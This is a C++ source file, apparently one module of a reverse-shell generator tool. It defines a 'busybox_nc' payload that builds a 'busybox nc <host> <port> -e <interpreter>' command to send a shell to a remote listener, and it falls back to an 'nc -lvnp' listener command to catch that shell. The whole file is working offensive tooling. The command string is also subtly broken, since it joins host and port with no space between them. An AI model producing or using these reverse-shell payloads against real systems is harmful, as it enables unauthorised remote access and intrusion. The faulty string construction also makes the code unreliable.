#include "Busybox_Nc_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string BusyboxNcPayload::name() const {
return "busybox_nc";
}

std::string BusyboxNcPayload::generate(const Options& opts) const {
    return "busybox nc " + opts.host + std::to_string(opts.port) + " -e " + opts.interpreter;
}

std::string BusyboxNcPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}